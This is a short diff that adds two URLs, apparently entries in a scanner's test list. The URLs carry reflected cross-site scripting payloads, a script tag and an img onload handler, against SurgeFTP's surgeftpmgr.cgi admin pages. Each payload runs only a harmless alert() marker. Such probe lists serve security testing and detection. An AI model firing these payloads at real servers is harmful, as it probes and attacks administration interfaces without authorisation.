@@ -1,0 +1,2 @@
+http://www.example.com:7021/cgi/surgeftpmgr.cgi?domainid=&gt;&quot;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;&amp;cmd=user_admin
+http://www.example.com:7021/cgi/surgeftpmgr.cgi?domainid=-1&amp;cmd=class&amp;classid=&lt;img+src=http://127.0.0.1/t.gif+onload=alert(213771818860)&gt;
